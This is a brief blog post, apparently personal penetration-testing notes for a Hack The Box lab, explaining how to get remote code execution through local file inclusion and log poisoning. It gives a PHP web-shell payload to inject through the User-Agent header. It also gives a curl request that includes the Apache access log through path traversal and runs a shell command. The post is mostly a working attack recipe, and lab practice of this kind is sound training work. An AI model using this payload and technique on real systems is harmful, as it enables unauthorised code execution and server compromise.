---
layout: post
title: LFI - Using access logs (Log Poisoning)
description: LFI - Using access logs (Log Poisoning)
summary: LFI - Using access logs (Log Poisoning)
tags: [web,lfi,php]
minute: 1
---
## Steps
* Ensure you can do LFI on access logs
* Insert this on useragent parameter

```
<?php echo shell_exec($_GET['cmd']);?>
```

![](/spindel/assets/LFI%20-%20Using%20access%20logs%20(Log%20Poisoning)/burp-changing-user-agent.png)

* Include the logs on next request

```
curl 'http://10.10.8.194/?view=../../../../var/log/apache2/access.log&ext=&cmd=whoami'
```

reference: [Remote Code Execution With LFI | C:\Helich0pper](https://helich0pper.github.io/LFI/)

## References
* HTB bart